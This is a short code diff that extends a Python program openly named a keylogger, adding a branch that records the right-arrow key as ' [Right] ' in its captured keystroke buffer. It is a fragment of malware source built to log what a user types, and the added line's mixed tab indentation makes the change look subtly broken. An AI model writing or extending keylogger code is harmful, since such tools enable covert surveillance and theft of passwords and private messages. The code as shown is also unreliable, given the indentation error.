@@ -149,6 +149,8 @@ def KeyFilters(event):
         Keylogger.i += ' [Down] '
     elif (event.KeyID is 37):
         Keylogger.i += ' [Left] '
+	elif (event.KeyID is 39):
+        Keylogger.i += ' [Right] '
     elif (event.KeyID is 91):
         Keylogger.i += ' [Windows] '
     else:
